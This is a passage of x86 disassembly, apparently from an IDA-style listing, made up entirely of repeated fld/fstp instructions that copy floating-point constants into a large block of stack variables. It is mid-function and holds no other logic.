		fstp	[ebp+var_2F40]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_2F38]
		fld	ds:dbl_424510
		fstp	[ebp+var_2F30]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_2F28]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_2F20]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_2F18]
		fld	ds:dbl_424520
		fstp	[ebp+var_2F10]
		fld	ds:dbl_424838
		fstp	[ebp+var_2F08]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_2F00]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_2EF8]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_2EF0]
		fld	ds:dbl_424680
		fstp	[ebp+var_2EE8]
		fldz
		fstp	[ebp+var_2EE0]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_2ED8]
		fld	ds:dbl_424828
		fstp	[ebp+var_2ED0]
		fld	ds:dbl_424580
		fstp	[ebp+var_2EC8]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2EC0]
		fld	ds:dbl_424698
		fstp	[ebp+var_2EB8]
		fld	ds:dbl_424468
		fstp	[ebp+var_2EB0]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_2EA8]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_2EA0]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_2E98]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_2E90]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_2E88]
		fld	ds:dbl_424458
		fstp	[ebp+var_2E80]
		fld	ds:dbl_424988
		fstp	[ebp+var_2E78]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2E70]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_2E68]
		fld	ds:dbl_424550
		fstp	[ebp+var_2E60]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2E58]
		fld	ds:dbl_424950
		fstp	[ebp+var_2E50]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_2E48]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_2E40]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_2E38]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_2E30]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_2E28]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_2E20]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2E18]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2E10]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_2E08]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2E00]
		fld	ds:dbl_424550
		fstp	[ebp+var_2DF8]
		fld	ds:dbl_424620
		fstp	[ebp+var_2DF0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_2DE8]
		fld	ds:dbl_424588
		fstp	[ebp+var_2DE0]
		fld	ds:dbl_424870
		fstp	[ebp+var_2DD8]
		fld	ds:dbl_424A58
		fstp	[ebp+var_2DD0]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_2DC8]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_2DC0]
		fld	ds:dbl_424848
		fstp	[ebp+var_2DB8]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_2DB0]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_2DA8]
		fld	ds:dbl_424880
		fstp	[ebp+var_2DA0]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_2D98]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_2D90]
		fld	ds:dbl_424698
		fstp	[ebp+var_2D88]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2D80]
		fld	ds:dbl_424558
		fstp	[ebp+var_2D78]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2D70]
		fld	ds:dbl_424B20
		fstp	[ebp+var_2D68]
		fld	ds:dbl_424988
		fstp	[ebp+var_2D60]
		fld	ds:dbl_424A48
		fstp	[ebp+var_2D58]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2D50]
		fld	ds:dbl_424910
		fstp	[ebp+var_2D48]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_2D40]
		fld	ds:dbl_424758
		fstp	[ebp+var_2D38]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_2D30]
		fld	ds:dbl_424900
		fstp	[ebp+var_2D28]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_2D20]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_2D18]
		fld	ds:dbl_424570
		fstp	[ebp+var_2D10]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_2D08]
		fld	ds:dbl_424988
		fstp	[ebp+var_2D00]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_2CF8]
		fld	ds:dbl_424958
		fstp	[ebp+var_2CF0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2CE8]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_2CE0]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_2CD8]
		fld	ds:dbl_424A38
		fstp	[ebp+var_2CD0]
		fld	ds:dbl_424C10
		fstp	[ebp+var_2CC8]
		fld	ds:dbl_424898
		fstp	[ebp+var_2CC0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_2CB8]
		fld	ds:dbl_424980
		fstp	[ebp+var_2CB0]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_2CA8]
		fld	ds:dbl_424B78
		fstp	[ebp+var_2CA0]
		fld	ds:dbl_424930
		fstp	[ebp+var_2C98]
		fld	ds:dbl_424608
		fstp	[ebp+var_2C90]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2C88]
		fld	ds:dbl_424A80
		fstp	[ebp+var_2C80]
		fld	ds:dbl_424918
		fstp	[ebp+var_2C78]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_2C70]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2C68]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_2C60]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2C58]
		fld	ds:dbl_424548
		fstp	[ebp+var_2C50]
		fld	ds:dbl_424538
		fstp	[ebp+var_2C48]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2C40]
		fld	ds:dbl_424470
		fstp	[ebp+var_2C38]
		fld	ds:dbl_424968
		fstp	[ebp+var_2C30]
		fldz
		fstp	[ebp+var_2C28]
		fld1
		fstp	[ebp+var_2C20]
		fld	ds:dbl_424970
		fstp	[ebp+var_2C18]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2C10]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_2C08]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2C00]
		fld	ds:dbl_424760
		fstp	[ebp+var_2BF8]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_2BF0]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_2BE8]
		fld	ds:dbl_424888
		fstp	[ebp+var_2BE0]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_2BD8]
		fld	ds:dbl_424700
		fstp	[ebp+var_2BD0]
		fld	ds:dbl_424B50
		fstp	[ebp+var_2BC8]
		fld	ds:dbl_424580
		fstp	[ebp+var_2BC0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_2BB8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_2BB0]
		fld	ds:dbl_424738
		fstp	[ebp+var_2BA8]
		fld	ds:dbl_424880
		fstp	[ebp+var_2BA0]
		fld	ds:dbl_424500
		fstp	[ebp+var_2B98]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2B90]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2B88]
		fld	ds:dbl_424578
		fstp	[ebp+var_2B80]
		fld	ds:dbl_424530
		fstp	[ebp+var_2B78]
		fld	ds:dbl_424C20
		fstp	[ebp+var_2B70]
		fld	ds:dbl_424858
		fstp	[ebp+var_2B68]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_2B60]
		fld	ds:dbl_424600
		fstp	[ebp+var_2B58]
		fld	ds:dbl_424B98
		fstp	[ebp+var_2B50]
		fld	ds:dbl_424520
		fstp	[ebp+var_2B48]
		fld	ds:dbl_424920
		fstp	[ebp+var_2B40]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2B38]
		fld	ds:dbl_424508
		fstp	[ebp+var_2B30]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_2B28]
		fld	ds:dbl_424930
		fstp	[ebp+var_2B20]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_2B18]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_2B10]
		fld	ds:dbl_424718
		fstp	[ebp+var_2B08]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_2B00]
		fld	ds:dbl_424598
		fstp	[ebp+var_2AF8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_2AF0]
		fld	ds:dbl_424500
		fstp	[ebp+var_2AE8]
		fld	ds:dbl_424468
		fstp	[ebp+var_2AE0]
		fld	ds:dbl_424668
		fstp	[ebp+var_2AD8]
		fld	ds:dbl_424800
		fstp	[ebp+var_2AD0]
		fld	ds:dbl_424698
		fstp	[ebp+var_2AC8]
		fld	ds:dbl_424920
		fstp	[ebp+var_2AC0]
		fld	ds:dbl_424588
		fstp	[ebp+var_2AB8]
		fld	ds:dbl_424B00
		fstp	[ebp+var_2AB0]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_2AA8]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_2AA0]
		fld	ds:dbl_424588
		fstp	[ebp+var_2A98]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_2A90]
		fld	ds:dbl_424930
		fstp	[ebp+var_2A88]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2A80]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_2A78]
		fld1
		fstp	[ebp+var_2A70]
		fld	ds:dbl_424B00
		fstp	[ebp+var_2A68]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2A60]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2A58]
		fld	ds:dbl_424B00
		fstp	[ebp+var_2A50]
		fld	ds:dbl_424640
		fstp	[ebp+var_2A48]
		fld	ds:dbl_424B08
		fstp	[ebp+var_2A40]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2A38]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2A30]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_2A28]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_2A20]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_2A18]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_2A10]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_2A08]
		fld	ds:dbl_424570
		fstp	[ebp+var_2A00]
		fld	ds:dbl_424728
		fstp	[ebp+var_29F8]
		fld	ds:dbl_424878
		fstp	[ebp+var_29F0]
		fld	ds:dbl_424528
		fstp	[ebp+var_29E8]
		fld	ds:dbl_424578
		fstp	[ebp+var_29E0]
		fld	ds:dbl_424940
		fstp	[ebp+var_29D8]
		fld	ds:dbl_424C28
		fstp	[ebp+var_29D0]
		fld	ds:dbl_424A50
		fstp	[ebp+var_29C8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_29C0]
		fld	ds:dbl_424540
		fstp	[ebp+var_29B8]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_29B0]
		fld	ds:dbl_424450
		fstp	[ebp+var_29A8]
		fld	ds:dbl_424C08
		fstp	[ebp+var_29A0]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_2998]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2990]
		fld	ds:dbl_424520
		fstp	[ebp+var_2988]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2980]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_2978]
		fld	ds:dbl_424A48
		fstp	[ebp+var_2970]
		fld	ds:dbl_424940
		fstp	[ebp+var_2968]
		fld	ds:dbl_424880
		fstp	[ebp+var_2960]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_2958]
		fld	ds:dbl_424630
		fstp	[ebp+var_2950]
		fld	ds:dbl_424A38
		fstp	[ebp+var_2948]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2940]
		fld	ds:dbl_424458
		fstp	[ebp+var_2938]
		fld	ds:dbl_424788
		fstp	[ebp+var_2930]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_2928]
		fld	ds:dbl_424800
		fstp	[ebp+var_2920]
		fld	ds:dbl_424430
		fstp	[ebp+var_2918]
		fld	ds:dbl_424760
		fstp	[ebp+var_2910]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_2908]
		fld	ds:dbl_424938
		fstp	[ebp+var_2900]
		fld	ds:dbl_424930
		fstp	[ebp+var_28F8]
		fld	ds:dbl_424A58
		fstp	[ebp+var_28F0]
		fld	ds:dbl_424968
		fstp	[ebp+var_28E8]
		fld	ds:dbl_424758
		fstp	[ebp+var_28E0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_28D8]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_28D0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_28C8]
		fld	ds:dbl_424528
		fstp	[ebp+var_28C0]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_28B8]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_28B0]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_28A8]
		fld	ds:dbl_424950
		fstp	[ebp+var_28A0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2898]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_2890]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2888]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_2880]
		fld	ds:dbl_424890
		fstp	[ebp+var_2878]
		fld	ds:dbl_424B50
		fstp	[ebp+var_2870]
		fld	ds:dbl_424580
		fstp	[ebp+var_2868]
		fld1
		fstp	[ebp+var_2860]
		fld	ds:dbl_424B58
		fstp	[ebp+var_2858]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_2850]
		fld	ds:dbl_424670
		fstp	[ebp+var_2848]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2840]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_2838]
		fld	ds:dbl_424458
		fstp	[ebp+var_2830]
		fld	ds:dbl_424A28
		fstp	[ebp+var_2828]
		fld	ds:dbl_424648
		fstp	[ebp+var_2820]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_2818]
		fld	ds:dbl_424B50
		fstp	[ebp+var_2810]
		fld	ds:dbl_424710
		fstp	[ebp+var_2808]
		fld	ds:dbl_424648
		fstp	[ebp+var_2800]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_27F8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_27F0]
		fld	ds:dbl_424598
		fstp	[ebp+var_27E8]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_27E0]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_27D8]
		fld	ds:dbl_424B20
		fstp	[ebp+var_27D0]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_27C8]
		fld	ds:dbl_424960
		fstp	[ebp+var_27C0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_27B8]
		fld	ds:dbl_424620
		fstp	[ebp+var_27B0]
		fld1
		fstp	[ebp+var_27A8]
		fld	ds:dbl_424488
		fstp	[ebp+var_27A0]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_2798]
		fld	ds:dbl_424A50
		fstp	[ebp+var_2790]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_2788]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_2780]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2778]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_2770]
		fld	ds:dbl_424720
		fstp	[ebp+var_2768]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_2760]
		fld	ds:dbl_424958
		fstp	[ebp+var_2758]
		fld	ds:dbl_424628
		fstp	[ebp+var_2750]
		fld	ds:dbl_424C20
		fstp	[ebp+var_2748]
		fld	ds:dbl_424430
		fstp	[ebp+var_2740]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2738]
		fld	ds:dbl_424A38
		fstp	[ebp+var_2730]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_2728]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_2720]
		fld	ds:dbl_424C10
		fstp	[ebp+var_2718]
		fld	ds:dbl_424880
		fstp	[ebp+var_2710]
		fld	ds:dbl_424810
		fstp	[ebp+var_2708]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_2700]
		fld	ds:dbl_424A00
		fstp	[ebp+var_26F8]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_26F0]
		fld	ds:dbl_424598
		fstp	[ebp+var_26E8]
		fld	ds:dbl_424888
		fstp	[ebp+var_26E0]
		fld	ds:dbl_424848
		fstp	[ebp+var_26D8]
		fld	ds:dbl_424760
		fstp	[ebp+var_26D0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_26C8]
		fld	ds:dbl_424B40
		fstp	[ebp+var_26C0]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_26B8]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_26B0]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_26A8]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_26A0]
		fld	ds:dbl_424A70
		fstp	[ebp+var_2698]
		fld	ds:dbl_424B20
		fstp	[ebp+var_2690]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2688]
		fld	ds:dbl_424530
		fstp	[ebp+var_2680]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_2678]
		fld	ds:dbl_424B20
		fstp	[ebp+var_2670]
		fld	ds:dbl_424958
		fstp	[ebp+var_2668]
		fld	ds:dbl_424758
		fstp	[ebp+var_2660]
		fld	ds:dbl_424980
		fstp	[ebp+var_2658]
		fld	ds:dbl_424490
		fstp	[ebp+var_2650]
		fld	ds:dbl_424B38
		fstp	[ebp+var_2648]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_2640]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2638]
		fld	ds:dbl_424690
		fstp	[ebp+var_2630]
		fld	ds:dbl_424990
		fstp	[ebp+var_2628]
		fld	ds:dbl_424B38
		fstp	[ebp+var_2620]
		fld	ds:dbl_424900
		fstp	[ebp+var_2618]
		fld	ds:dbl_424458
		fstp	[ebp+var_2610]
		fld	ds:dbl_424A98
		fstp	[ebp+var_2608]
		fld	ds:dbl_424908
		fstp	[ebp+var_2600]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_25F8]
		fld	ds:dbl_424930
		fstp	[ebp+var_25F0]
		fld	ds:dbl_424B68
		fstp	[ebp+var_25E8]
		fld	ds:dbl_424628
		fstp	[ebp+var_25E0]
		fld	ds:dbl_424458
		fstp	[ebp+var_25D8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_25D0]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_25C8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_25C0]
		fld	ds:dbl_424678
		fstp	[ebp+var_25B8]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_25B0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_25A8]
		fld	ds:dbl_424968
		fstp	[ebp+var_25A0]
		fld	ds:dbl_424708
		fstp	[ebp+var_2598]
		fld	ds:dbl_424A40
		fstp	[ebp+var_2590]
		fld	ds:dbl_424920
		fstp	[ebp+var_2588]
		fld	ds:dbl_424488
		fstp	[ebp+var_2580]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_2578]
		fld	ds:dbl_424520
		fstp	[ebp+var_2570]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_2568]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_2560]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2558]
		fld	ds:dbl_424888
		fstp	[ebp+var_2550]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_2548]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_2540]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_2538]
		fld	ds:dbl_424838
		fstp	[ebp+var_2530]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_2528]
		fld	ds:dbl_424680
		fstp	[ebp+var_2520]
		fld	ds:dbl_424A40
		fstp	[ebp+var_2518]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2510]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_2508]
		fld	ds:dbl_424638
		fstp	[ebp+var_2500]
		fld	ds:dbl_424C28
		fstp	[ebp+var_24F8]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_24F0]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_24E8]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_24E0]
		fld	ds:dbl_424920
		fstp	[ebp+var_24D8]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_24D0]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_24C8]
		fld	ds:dbl_424658
		fstp	[ebp+var_24C0]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_24B8]
		fld	ds:dbl_424950
		fstp	[ebp+var_24B0]
		fld	ds:dbl_424918
		fstp	[ebp+var_24A8]
		fld	ds:dbl_424698
		fstp	[ebp+var_24A0]
		fld	ds:dbl_424538
		fstp	[ebp+var_2498]
		fld	ds:dbl_424838
		fstp	[ebp+var_2490]
		fld	ds:dbl_424498
		fstp	[ebp+var_2488]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_2480]
		fld	ds:dbl_424978
		fstp	[ebp+var_2478]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_2470]
		fld	ds:dbl_424A60
		fstp	[ebp+var_2468]
		fld	ds:dbl_424888
		fstp	[ebp+var_2460]
		fld	ds:dbl_424A90
		fstp	[ebp+var_2458]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_2450]
		fld	ds:dbl_424478
		fstp	[ebp+var_2448]
		fld	ds:dbl_424568
		fstp	[ebp+var_2440]
		fld	ds:dbl_424560
		fstp	[ebp+var_2438]
		fld	ds:dbl_424670
		fstp	[ebp+var_2430]
		fld	ds:dbl_424B70
		fstp	[ebp+var_2428]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_2420]
		fld	ds:dbl_424B38
		fstp	[ebp+var_2418]
		fld	ds:dbl_424548
		fstp	[ebp+var_2410]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_2408]
		fld	ds:dbl_424880
		fstp	[ebp+var_2400]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_23F8]
		fld	ds:dbl_424638
		fstp	[ebp+var_23F0]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_23E8]
		fld	ds:dbl_424578
		fstp	[ebp+var_23E0]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_23D8]
		fld	ds:dbl_424B18
		fstp	[ebp+var_23D0]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_23C8]
		fld	ds:dbl_424598
		fstp	[ebp+var_23C0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_23B8]
		fld	ds:dbl_424438
		fstp	[ebp+var_23B0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_23A8]
		fld	ds:dbl_424718
		fstp	[ebp+var_23A0]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_2398]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_2390]
		fld	ds:dbl_424B60
		fstp	[ebp+var_2388]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_2380]
		fld	ds:dbl_424698
		fstp	[ebp+var_2378]
		fld	ds:dbl_424C18
		fstp	[ebp+var_2370]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_2368]
		fld	ds:dbl_424730
		fstp	[ebp+var_2360]
		fld	ds:dbl_424800
		fstp	[ebp+var_2358]
		fld	ds:dbl_424978
		fstp	[ebp+var_2350]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_2348]
		fld	ds:dbl_424A28
		fstp	[ebp+var_2340]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2338]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_2330]
		fld	ds:dbl_424950
		fstp	[ebp+var_2328]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2320]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_2318]
		fld	ds:dbl_424520
		fstp	[ebp+var_2310]
		fld	ds:dbl_424590
		fstp	[ebp+var_2308]
		fld	ds:dbl_424688
		fstp	[ebp+var_2300]
		fldz
		fstp	[ebp+var_22F8]
		fld	ds:dbl_424B58
		fstp	[ebp+var_22F0]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_22E8]
		fld	ds:dbl_424B18
		fstp	[ebp+var_22E0]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_22D8]
		fld	ds:dbl_424920
		fstp	[ebp+var_22D0]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_22C8]
		fld	ds:dbl_424760
		fstp	[ebp+var_22C0]
		fld	ds:dbl_424548
		fstp	[ebp+var_22B8]
		fld	ds:dbl_424A70
		fstp	[ebp+var_22B0]
		fld	ds:dbl_424530
		fstp	[ebp+var_22A8]
		fld	ds:dbl_424908
		fstp	[ebp+var_22A0]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_2298]
		fld	ds:dbl_424590
		fstp	[ebp+var_2290]
		fld	ds:dbl_424548
		fstp	[ebp+var_2288]
		fld	ds:dbl_424718
		fstp	[ebp+var_2280]
		fld	ds:dbl_424560
		fstp	[ebp+var_2278]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2270]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2268]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2260]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_2258]
		fld	ds:dbl_424638
		fstp	[ebp+var_2250]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_2248]
		fld	ds:dbl_424818
		fstp	[ebp+var_2240]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_2238]
		fld	ds:dbl_424440
		fstp	[ebp+var_2230]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_2228]
		fld	ds:dbl_424528
		fstp	[ebp+var_2220]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_2218]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_2210]
		fld	ds:dbl_424588
		fstp	[ebp+var_2208]
		fld	ds:dbl_424C20
		fstp	[ebp+var_2200]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_21F8]
		fld	ds:dbl_424540
		fstp	[ebp+var_21F0]
		fld	ds:dbl_424470
		fstp	[ebp+var_21E8]
		fld	ds:dbl_424580
		fstp	[ebp+var_21E0]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_21D8]
		fld	ds:dbl_424760
		fstp	[ebp+var_21D0]
		fld	ds:dbl_424850
		fstp	[ebp+var_21C8]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_21C0]
		fld	ds:dbl_424758
		fstp	[ebp+var_21B8]
		fld	ds:dbl_424A40
		fstp	[ebp+var_21B0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_21A8]
		fld	ds:dbl_424910
		fstp	[ebp+var_21A0]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_2198]
		fld	ds:dbl_424688
		fstp	[ebp+var_2190]
		fld	ds:dbl_424B40
		fstp	[ebp+var_2188]
		fld	ds:dbl_424828
		fstp	[ebp+var_2180]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_2178]
		fld	ds:dbl_424B98
		fstp	[ebp+var_2170]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_2168]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2160]
		fld	ds:dbl_424A10
		fstp	[ebp+var_2158]
		fld	ds:dbl_424B08
		fstp	[ebp+var_2150]
		fld	ds:dbl_424B30
		fstp	[ebp+var_2148]
		fld	ds:dbl_424938
		fstp	[ebp+var_2140]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_2138]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_2130]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_2128]
		fld	ds:dbl_424B20
		fstp	[ebp+var_2120]
		fld	ds:dbl_424890
		fstp	[ebp+var_2118]
		fld	ds:dbl_424870
		fstp	[ebp+var_2110]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_2108]
		fld	ds:dbl_424898
		fstp	[ebp+var_2100]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_20F8]
		fld	ds:dbl_424A98
		fstp	[ebp+var_20F0]
		fld	ds:dbl_424990
		fstp	[ebp+var_20E8]
		fld	ds:dbl_424850
		fstp	[ebp+var_20E0]
		fld	ds:dbl_424700
		fstp	[ebp+var_20D8]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_20D0]
		fld	ds:dbl_424610
		fstp	[ebp+var_20C8]
		fld	ds:dbl_424908
		fstp	[ebp+var_20C0]
		fld	ds:dbl_424B48
		fstp	[ebp+var_20B8]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_20B0]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_20A8]
		fld	ds:dbl_424858
		fstp	[ebp+var_20A0]
		fld	ds:dbl_424808
		fstp	[ebp+var_2098]
		fld	ds:dbl_424628
		fstp	[ebp+var_2090]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2088]
		fld	ds:dbl_424708
		fstp	[ebp+var_2080]
		fld	ds:dbl_424700
		fstp	[ebp+var_2078]
		fld	ds:dbl_424568
		fstp	[ebp+var_2070]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_2068]
